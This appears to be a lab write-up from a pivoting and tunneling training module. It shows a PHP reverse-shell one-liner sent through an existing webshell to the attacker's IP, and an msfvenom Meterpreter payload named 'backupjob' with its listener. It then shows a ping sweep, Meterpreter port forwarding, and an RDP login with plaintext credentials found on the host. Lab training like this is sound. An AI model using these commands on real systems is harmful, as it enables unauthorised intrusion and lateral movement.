Linux
IP - 10.129.194.105
Existing webshell at http://10.129.194.105:80/, get a reverse shell

```bash
p0wny@shell:…/www/html# php -r '$sock=fsockopen("10.10.16.56",1234);exec("bash <&3 >&3 2>&3");'

--------------------------

┌──(kali㉿kali)-[~/Documents/Academy/Pivoting-Tunneling-and-Port-forwarding]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.56] from (UNKNOWN) [10.129.194.105] 55564
whoami
www-data
```

Upgrade TTY. Lets create a meterpreter session

```bash
┌──(kali㉿kali)-[~/Documents/Academy/Pivoting-Tunneling-and-Port-forwarding/lab]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.56 LPORT=8080 -f elf -o backupjob
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

Move the file to the server and execute, catching the meterpreter with metasploit

```bash
┌──(kali㉿kali)-[~/Documents/Academy/Pivoting-Tunneling-and-Port-forwarding/lab]
└─$ sudo msfconsole -q                                                                            
[sudo] password for kali: 
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8080 
[*] Sending stage (3045348 bytes) to 10.129.194.105
[*] Meterpreter session 1 opened (10.10.16.56:8080 -> 10.129.194.105:44336) at 2023-08-23 11:06:00 +0200

meterpreter > getuid
Server username: www-data
```

In `/home/webadmin` folder we find `for-admin-eyes-only` file with credentials mlefay:'Plain Human work!' :

```plain/text
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of : 
Plain Human work!
```

And a `id_rsa` file. With ping sweep we found the IP 172.16.5.35

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.028 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.528 ms
```

In 172.16.5.35 we have a Windows (we know for the ttl) so we will connect through port 3389 (RDP), so lets set up port forwarding

```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.35
[*] Forward TCP relay created: (local) :3300 -> (remote) 172.16.5.35:3389

------------

┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:localhost:3300 /u:mlefay /p:'Plain Human work!'
```

And now we have access to the windows machine